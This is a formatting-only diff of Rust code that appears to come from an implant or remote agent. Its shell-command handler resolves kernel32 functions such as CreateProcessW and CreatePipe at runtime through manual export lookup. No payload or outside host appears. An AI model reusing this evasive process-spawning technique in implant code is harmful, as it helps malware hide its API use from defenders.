@@ -51,8 +51,12 @@ type CreateProcessW = unsafe extern "system" fn(
     lp_process_information: *mut ProcessInformation,
 ) -> i32;
 
-type CreatePipe =
-    unsafe extern "system" fn(*mut *mut c_void, *mut *mut c_void, *const SecurityAttributes, u32) -> i32;
+type CreatePipe = unsafe extern "system" fn(
+    *mut *mut c_void,
+    *mut *mut c_void,
+    *const SecurityAttributes,
+    u32,
+) -> i32;
 
 type ReadFile = unsafe extern "system" fn(
     h_file: *mut c_void,
@@ -135,10 +139,11 @@ unsafe fn run_shell_inner(args: &str) -> Response {
             Some(a) => core::mem::transmute(a),
             None => return Response::Err(String::from("shell: WaitForSingleObject unresolved")),
         };
-    let _get_exit_code: GetExitCodeProcess = match export_addr(b"kernel32.dll", b"GetExitCodeProcess") {
-        Some(a) => core::mem::transmute(a),
-        None => return Response::Err(String::from("shell: GetExitCodeProcess unresolved")),
-    };
+    let _get_exit_code: GetExitCodeProcess =
+        match export_addr(b"kernel32.dll", b"GetExitCodeProcess") {
+            Some(a) => core::mem::transmute(a),
+            None => return Response::Err(String::from("shell: GetExitCodeProcess unresolved")),
+        };
     let close_handle: CloseHandle = match export_addr(b"kernel32.dll", b"CloseHandle") {
         Some(a) => core::mem::transmute(a),
         None => return Response::Err(String::from("shell: CloseHandle unresolved")),
